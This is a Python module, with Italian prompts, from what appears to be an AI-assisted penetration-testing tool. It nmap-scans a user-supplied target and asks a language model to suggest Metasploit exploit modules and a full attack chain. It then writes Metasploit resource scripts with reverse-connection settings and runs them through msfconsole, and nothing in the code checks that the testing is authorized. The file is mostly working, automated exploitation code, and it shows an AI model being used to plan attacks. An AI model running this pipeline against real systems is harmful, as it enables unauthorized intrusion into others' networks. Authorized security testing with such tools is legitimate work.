import os
import datetime
import subprocess
from rich import print
from rich.console import Console
from utils import config_ai
from utils.ai_assistant import ask_ai
from utils.exploit_utils import generate_exploit_list, load_valid_exploits, extract_modules, exploit_list_exists

SCANS_DIR = "scans"
LPORT = "8080"
console = Console()


def get_local_ip():
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

LHOST = get_local_ip()

def prompt_step(message):
    console.print(f"\n[bold cyan]{message}[/bold cyan]")
    console.print("Premi [Invio] per continuare | s = salta | q = menu principale")
    choice = input("Scelta: ").strip().lower()
    if choice == 'q':
        return "exit"
    elif choice == 's':
        return "skip"
    return "continue"

def build_nmap_command(target):
    console.print("\n[cyan]🔧 Modalità scansione:[/cyan]")
    console.print("[1] Scansione veloce (default)")
    console.print("[2] Scansione personalizzata")
    mode = input("Scelta: ").strip()

    if mode != "2":
        return ["nmap", "-sV", "-Pn", "-p-", "-T4", "-oN"]

    flags = []
    console.print("\n[cyan]✔ Seleziona opzioni Nmap personalizzate (scrivi 'y' per attivare):[/cyan]")

    if input("-sn (Ping only)? [y/N]: ").strip().lower() == 'y':
        flags.append("-sn")
    if input("-O (OS detection)? [y/N]: ").strip().lower() == 'y':
        flags.append("-O")
    if input("-F (Fast mode)? [y/N]: ").strip().lower() == 'y':
        flags.append("-F")
    if input("-A (Aggressiva: OS, versioni, script, traceroute)? [y/N]: ").strip().lower() == 'y':
        flags.append("-A")
    if input("Vuoi specificare porte con -p? [y/N]: ").strip().lower() == 'y':
        ports = input("Inserisci porte (es. 22,80,443): ").strip()
        if ports:
            flags.extend(["-p", ports])

    flags.extend(["-T4", "-oN"])
    return ["nmap"] + flags

def run_manual_scan(session_memory):
    while True:
        target = input("\n💻 Inserisci il target o premi Invio per tornare: ").strip()
        if not target:
            return
        print(f"\nHai inserito il target: {target}")
        conferma = input("✅ Premi [Invio] per continuare | r = reinserire | q = menu principale: ").strip().lower()

        if conferma == "":
            break
        elif conferma == "q":
            return    
    

    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    base_dir = os.path.join(SCANS_DIR, timestamp)
    os.makedirs(base_dir, exist_ok=True)
    nmap_output_file = os.path.join(base_dir, "nmap_scan.txt")
    nmap_xml_file = os.path.join(base_dir, "nmap_scan.xml")

    # Salva il target per il report
    with open(os.path.join(base_dir, "target.txt"), "w", encoding="utf-8") as f:
        f.write(target)

    # Scelta tipo scansione
    nmap_cmd = build_nmap_command(target)
    print("\n[cyan]🔍 Scansione Nmap in corso...[/cyan]")
    try:
        # -oX per searchsploit; "--" impedisce che un target tipo "-oG" sia preso come flag
        subprocess.run(nmap_cmd + [nmap_output_file, "-oX", nmap_xml_file, "--", target])
    except FileNotFoundError:
        print("[red]❌ Nmap non trovato. Installalo per eseguire la scansione.[/red]")
        return

    if not os.path.exists(nmap_output_file):
        print("[red]❌ Scansione Nmap fallita: nessun output generato.[/red]")
        return

    with open(nmap_output_file, "r", encoding="utf-8", errors="replace") as f:
        nmap_data = f.read()

    # Registra il target (indipendentemente dagli step successivi)
    session_memory["targets"].append(target)

    print("\n[green]✔ Scansione completata.[/green]")
    step = prompt_step("Vuoi continuare con l'analisi AI?")
    if step == "exit":
        return
    elif step == "skip":
        response_text = ""
    else:
        print("\n[bold]🧠 Invio a IA per analisi...[/bold]")
        prompt = (
            f"Ecco l'output Nmap:\n\n{nmap_data}\n\n"
            "Suggerisci moduli exploit Metasploit da usare. Scrivi solo i nomi dei moduli uno per riga. In italiano."
        )
        response_text = ask_ai(prompt, model=config_ai.AI_MODEL_DEFAULT)

        print("\n[green]Risposta IA:[/green]\n")
        print(response_text)
        response_file = os.path.join(base_dir, "ollama_response.txt")
        with open(response_file, "w", encoding="utf-8") as f:
            f.write(response_text)

    step = prompt_step("Vuoi continuare con la chain di attacco suggerita?")
    if step == "exit":
        return
    elif step != "skip":
        extra_prompt = (
            f"Basandoti su questo scan Nmap:\n\n{nmap_data}\n\n"
            "Suggerisci una chain di attacco completa. Scrivi in italiano."
        )
        extra_response = ask_ai(extra_prompt, model=config_ai.AI_MODEL_DEFAULT)
        with open(os.path.join(base_dir, "suggestions.txt"), "w", encoding="utf-8") as f:
            f.write(extra_response)
        print("\n[cyan]📋 Chain suggerita:[/cyan]\n")
        print(extra_response)

    step = prompt_step("Vuoi generare gli exploit Metasploit (.rc)?")
    if step == "exit":
        return
    elif step != "skip":
        script_dir = os.path.join(base_dir, "scripts")
        os.makedirs(script_dir, exist_ok=True)

        if not exploit_list_exists():
            console.print("[yellow]⚠️ File 'exploit_list.txt' non trovato. Generazione automatica in corso...[/yellow]")
            generate_exploit_list()

        valid_exploits = load_valid_exploits()
        modules = extract_modules(response_text, valid_exploits)

        if not modules:
            print("\n[yellow]⚠️ Nessun modulo 'exploit/' rilevato nei suggerimenti AI. File .rc non generati.[/yellow]")
        else:
            for idx, module in enumerate(modules, 1):
                rc_file = os.path.join(script_dir, f"exploit_{idx}.rc")
                with open(rc_file, "w", encoding="utf-8") as f:
                    f.write(f"use {module}\n")
                    f.write(f"set RHOST {target}\n")
                    f.write(f"set LHOST {LHOST}\n")
                    f.write(f"set LPORT {LPORT}\n")
                    f.write("exploit -j\n")
                    f.write("exit\n")
                print(f"[yellow]📄 Creato:[/yellow] {rc_file}")

        session_memory["suggested_modules"].extend(modules)

    step = prompt_step("Vuoi eseguire gli exploit generati?")
    if step == "exit":
        return
    elif step != "skip":
        script_dir = os.path.join(base_dir, "scripts")
        if os.path.exists(script_dir):
            for rc in os.listdir(script_dir):
                rc_path = os.path.join(script_dir, rc)
                try:
                    subprocess.run(["msfconsole", "-q", "-r", rc_path], timeout=600)
                except FileNotFoundError:
                    print("[red]❌ msfconsole non trovato: impossibile eseguire gli exploit.[/red]")
                    break
                except subprocess.TimeoutExpired:
                    print(f"[red]⏳ Timeout nell'esecuzione di {rc_path}[/red]")

    step = prompt_step("Vuoi generare il report PDF della sessione?")
    if step == "exit":
        return
    elif step != "skip":
        try:
            from utils.reporting import generate_session_report
            generate_session_report()
        except Exception as e:
            print(f"[red]❌ Errore generazione report PDF:[/red] {e}")

    print(f"\n[green]✔ Pentest completato. Output salvato in:[/green] {base_dir}")
    console.input("\n[green]Premi Invio per tornare al menu...[/green]")
